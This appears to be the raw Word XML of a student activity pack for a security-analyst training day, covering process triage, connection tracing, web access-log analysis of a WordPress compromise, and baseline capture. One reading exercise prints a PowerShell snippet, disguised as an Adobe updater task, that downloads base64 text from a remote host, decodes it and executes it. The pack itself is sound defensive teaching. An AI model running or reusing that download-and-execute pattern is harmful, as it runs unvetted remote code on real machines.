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5 — STUDENT ACTIVITY PACK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Underneath the Alert — the Machine, the Wire, the Web and the Script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Everything you do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Machine Underneath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Preparing and Maintaining the Analyst Workstation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Wire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Web Request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5.5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Reading Scripts for Triage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WHAT IS IN THIS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1 — "Where Does It Live?"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8:35 AM, live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2 — "Follow the Connection"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9:40 AM, breakout pairs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3 — "Access-Log Detective"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10:40 AM, breakout teams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4 — "Explain This Script, Don't Run It"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11:15 AM, breakout pairs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afternoon — Tasks 1–9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1:00–4:00 PM, on your own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THE TWO RULES THAT COVER THE WHOLE DAY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- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="2A3A4A"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Read a suspicious script. Never run it.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2A3A4A"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="2A3A4A"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Scan only a machine you are authorised to scan</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2A3A4A"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> — today, only your own (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="A03020"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>127.0.0.1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2A3A4A"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">You also need two files sent with your joining note: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>`Day_5_access_log.txt`</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>`Day_5_log_parser.py`</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>. Put both in a folder you can find.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ACTIVITY 1: WHERE DOES IT LIVE?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8:35 AM · 12 minutes · Topic 5.1 · answers in the chat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">For each item, decide </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>NORMAL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>SUSPICIOUS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, and be ready to say why in one line. Speed matters — a few seconds each. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>The reason is what is marked, not the word.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answer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one-line reason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svchost.exe</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve"> running from </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="A03020"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>C:\Windows\System32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svchost.exe</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve"> running from </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="A03020"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>C:\Users\Public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chrome.exe</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve"> running from </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="A03020"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>C:\Program Files\Google\Chrome\...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explorer.exe</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve"> running from your </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="A03020"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Downloads</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve"> folder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scheduled task </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="A03020"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Adobe Update Checker</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve"> running an encoded PowerShell command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service </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="A03020"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Windows Update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A03020"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>wuauserv</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>) set to start automatically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lsass.exe</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve"> in </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="A03020"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>C:\Windows\System32</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>, signed by Microsoft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process named </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="A03020"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>1sass.exe</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve"> (with a digit one) in </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="A03020"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>C:\Temp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startup entry pointing at a </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="A03020"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>.vbs</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve"> file in a temp folder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python.exe</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve"> in </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="A03020"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>C:\Python314</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>, because you installed Python this morning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ACTIVITY 2: FOLLOW THE CONNECTION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 xml:space="preserve">9:40 AM · 25 minutes · Topic 5.3 · breakout pairs · </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="2E75B6"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>THIS IS OBSERVED</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">You will trace one of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>your own</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> live network connections to the program that owns it, then report it to your partner </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>using only clues</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> — never your own IP address. This is the Day 3 never-paste rule, on your own machine.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1B3A5C"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>Step 1 — make a connection to trace</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Open a normal website in your browser (or the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="A03020"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>http.server</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> from the demo). This creates live connections.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1B3A5C"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>Step 2 — list your connections with their owning process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Established |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Select-Object LocalPort, RemoteAddress, RemotePort,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@{Name='Process'; Expression={ (Get-Process -Id $_.OwningProcess).ProcessName }} |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Format-Table -AutoSize</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(Or `netstat -ano | findstr ESTABLISHED` then `tasklist /fi "pid eq &lt;number&gt;"`.)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1B3A5C"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>Step 3 — pick ONE connection and fill this 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What </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>process</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve"> owns it?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What </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>remote port</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve"> is it on, and what service is that?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Is the remote address </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>public or private</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>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Does this connection make sense for that process?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Step 4 — report it to your partner, using clues only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Say it like this, out loud:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2A3A4A"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="2A3A4A"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>"I have a connection owned by [process], on port [number] which is [service], to a [public/private] address. It makes sense because [reason]."</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2A3A4A"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="2A3A4A"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Do NOT say your own IP address.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="2A3A4A"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> It identifies your machine. Describe the connection in clues — process, port, public/private — exactly as you would look up a clue and never send content.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What is observed:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (1) did you join the connection to its process without being told the exact command, and (2) did you report it in clues rather than reading out your own address?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ACTIVITY 3: ACCESS-LOG DETECTIVE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10:40 AM · 25 minutes · Topic 5.4 · breakout teams</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Your team gets forty lines of a web access log from a small website, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="A03020"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>www.example-client.ph</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (it is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="A03020"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Day_5_access_log.txt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, and the trainer will paste it into your room). </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Six addresses appear.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Tell the story of what happened, then decide.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1B3A5C"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>Step 1 — sort the addresses</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">For each address, say whether it is a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>normal visitor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>scanner</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, or the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>attacker</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>, and give the one line of evidence that tells you.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Address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Visitor / Scanner / Attacker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line that proves it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203.0.113.10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203.0.113.11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203.0.113.12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198.51.100.23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203.0.113.45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192.0.2.77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Step 2 — tell the attack story in order</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Put these five things in the order they happened, using the timestamps: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A scanner throws 404s hunting for admin and backup paths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The attacker brute-forces the WordPress login and gets in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The attacker uploads a plugin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The attacker runs commands through an uploaded file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Path-traversal attempts are blocked with 403s</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1B3A5C"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>Step 3 — the two questions that decide it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Which single line is the worst thing in the log, and why?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Threat, detection, or routine?</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Give the reason. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(Remember: the difference between threat and detection is containment, not severity.)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4 — ACTIVITY 4: EXPLAIN THIS SCRIPT, DON'T RUN IT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 xml:space="preserve">11:15 AM · 18 minutes · Topic 5.5 · breakout pairs · </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="2E75B6"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>DO NOT RUN ANY OF THESE</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Three scripts. For each, read it and answer: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>what does it do, does it contact the internet, and would you run it or escalate it?</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> You will not run any of them. Reading is the job.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1B3A5C"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>Script A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# collect-baseline.ps1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$out = "C:\Evidence\Day_05\baseline_processes.csv"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Get-Process | Select-Object Name, Id, Path, Company | Sort-Object Name | Export-Csv -Path $out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Write-Host "Wrote process list to $out"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does it do?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Does it contact the internet?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Run it, or escalate?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 xml:space="preserve">Script B </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="1B3A5C"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>(found in a scheduled task named "Adobe Update Checker")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$u = "hxxp://203.0.113.45/p.txt"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$c = (New-Object Net.WebClient).DownloadString($u)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$b = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($c))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Invoke-Expression $b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does it do?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Does it contact the internet?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Run it, or escalate?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Script C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import re, sys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from collections import Counter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LINE = re.compile(r'^(\S+) \S+ \S+ \[([^\]]+)\] "(\S+) (\S+) [^"]*" (\d{3}) ')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not_found = Counter()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with open(sys.argv[1], encoding="utf-8") as log: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for line in log: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m = LINE.match(line)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if not m: continue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ip, when, method, path, status = m.groups()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if status == 404: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not_found[ip] += 1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print("Total 404s:", sum(not_found.values()))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log has seven 404s. This script reports zero. Why?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is the lesson for trusting a script's silence?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5 — YOUR AFTERNOON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1:00 to 4:00 PM · on your own · about 2 hours 50 minutes</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Nine tasks. Everything you produce goes in a folder called </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="A03020"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Evidence/Day_05/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>. Submit by 4:00 PM.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 hand in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Workstation build checklist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Signed checklist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Capture and register your baseline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CSVs, hashed and named + register row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Maintain and back up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Maintenance note + two matching hashes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Annotate five of your own connections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Annotated capture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Draw your network's port map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Diagram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the web log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Six answers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Extend the parser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Script + its output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Re-ticket WKS-311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 + self-check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Reflection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Three answers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How the afternoon is marked</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>The reason matters more than the answer.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> A correct action with no reason is not competent; a well-reasoned answer that reaches a defensible conclusion is.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6 — AFTERNOON WORKSHEETS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TASK 1 — WORKSTATION BUILD CHECKLIST</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="2E75B6"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t xml:space="preserve">25 minutes · Topic 5.2 · </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b/>
          <w:color w:val="2E75B6"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>ICT311203</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="2E75B6"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t xml:space="preserve"> E1, E2</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Tick each item once done on your machine, and record the detail. This is you preparing your analyst workstation and recording it accurately.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Detail to record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PowerShell available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Version (</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="A03020"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>$PSVersionTable.PSVersion</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>):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Browser with developer tools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Name and version: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Python 3 installed (or noted as unavailable)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Version (</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="A03020"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>python --version</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>):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Portable tools present (TCPView, Autoruns) or noted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ones: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Evidence folder created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Path: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OH&amp;S: screen, chair, lighting checked (Day 3 audit)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thing you adjusted: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Sign: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 xml:space="preserve">  **Date:** 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2 — CAPTURE AND REGISTER YOUR BASELINE</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="2E75B6"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t xml:space="preserve">25 minutes · Topic 5.2 · </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b/>
          <w:color w:val="2E75B6"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>ICT311203</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="2E75B6"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t xml:space="preserve"> E3, E4 · </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b/>
          <w:color w:val="2E75B6"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>400311106</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="2E75B6"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t xml:space="preserve"> LO5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Step 1 — export the four lists</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (run each; they write into your evidence folder):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Get-Process       | Select-Object Name, Id, Path, Company | Sort-Object Name | Export-Csv .\baseline_processes.csv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Get-Service       | Select-Object Name, Status, StartType | Export-Csv .\baseline_services.csv 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Get-ScheduledTask | Select-Object TaskName, TaskPath, State | Export-Csv .\baseline_tasks.csv   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Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location | Export-Csv .\baseline_autoruns.csv -NoTypeInformation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Step 2 — hash each file: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Get-FileHash .\baseline_processes.csv -Algorithm SHA256</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Step 3 — name each to the Day 3 convention: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YYYY-MM-DD_TICKET_HOST_DESCRIPTION.csv</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="A03020"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>BASELINE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> as the ticket). </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Step 4 — register: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File name (renamed)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SHA-256 (first 12 chars)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processes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services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scheduled tasks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autoruns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One line:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> why is a baseline worth capturing when nothing is wrong?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pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1B3A5C"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>TASK 3 — MAINTAIN AND BACK UP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="2E75B6"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t xml:space="preserve">15 minutes · Topic 5.2 · </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b/>
          <w:color w:val="2E75B6"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>ICT311203</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="2E75B6"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t xml:space="preserve"> E4, E5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result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Antivirus on and up to date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Get-MpComputerStatus | Select AntivirusEnabled, RealTimeProtectionEnabled, AntivirusSignatureLastUpdated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Free disk space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Get-PSDrive C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Backup a baseline file, then verify the copy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Copy-Item .\baseline_processes.csv .\backup_processes.csv</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>; hash both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Original hash: </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve">_ / Copy hash: </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:i/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t xml:space="preserve"> / Match? </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>One line:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> why is an unverified copy not a real backup?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pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1B3A5C"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>TASK 4 — ANNOTATE FIVE OF YOUR OWN CONNECTIONS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
